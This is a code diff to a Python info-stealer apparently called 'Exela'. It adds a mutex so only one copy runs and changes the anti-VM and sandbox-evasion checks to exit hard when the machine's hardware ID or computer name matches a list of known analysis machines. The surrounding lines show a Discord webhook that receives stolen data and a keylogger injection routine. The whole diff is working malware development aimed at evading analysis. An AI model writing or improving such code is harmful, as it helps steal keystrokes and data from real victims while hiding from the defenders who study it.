@@ -11,6 +11,11 @@ wantS = "%StartuP%"
 methodxd = "%MethoD%"
 injectKeylogger = "%keyloggerinject???%"
 
+def create_mutex(mutex_value) -> bool:
+    kernel32 = ctypes.windll.kernel32 #kernel32.dll 
+    mutex = kernel32.CreateMutexA(None, False, mutex_value) # creating mutext
+    return kernel32.GetLastError() != 183 # return if the mutex created successfully or not
+
 class QuicaxdExela:
     def __init__(self):
         self.hook = dhooks.Webhook(UrLxD,avatar_url="https://i.hizliresim.com/94iepii.jfif", username="quicaxd")
@@ -1167,7 +1172,7 @@ class HardAntiVM:
     def __init__(self) -> None:
         if self.is_running_on_vm():
             print("VM Detected")
-            sys.exit(0)
+            os._exit(0)
         else:
             print("Normal Machine")
             thread = threading.Thread(target=QuicaxdExela,daemon=True)
@@ -1313,12 +1318,12 @@ class Antivirustotal:
                             "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R","COMPNAME_4491", "WILEYPC", "WORK","KATHLROGE","DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC","DESKTOP-NNSJYNR", "JULIA-PC","DESKTOP-BQISITB", "d1bnJkfVlH"]
         for identity in banned_hwids:
             if serialNumber in identity:
-                sys.exit(0)
+                os._exit(0)
             else:
                 continue
         for compnames in banned_compname:
             if os.getenv('computername') in compnames:
-                sys.exit(0)
+                os._exit(0)
             else:
                 continue           
 def injectKeyloggers():
@@ -1332,7 +1337,6 @@ def injectKeyloggers():
             logger.start_logging()
         except Exception as e:
             print(str(e))
-
 def callAllFunctions():
     Antivirustotal()
     if Anti_Vm == "false":
@@ -1343,4 +1347,9 @@ def callAllFunctions():
         HardAntiVM()
     injectKeyloggers()
 if __name__ == "__main__":
-    callAllFunctions()
+    if not create_mutex("Exela"):
+        print("mutex already exist")
+        os._exit(0)
+    else:
+        print("mutex created")
+        callAllFunctions()
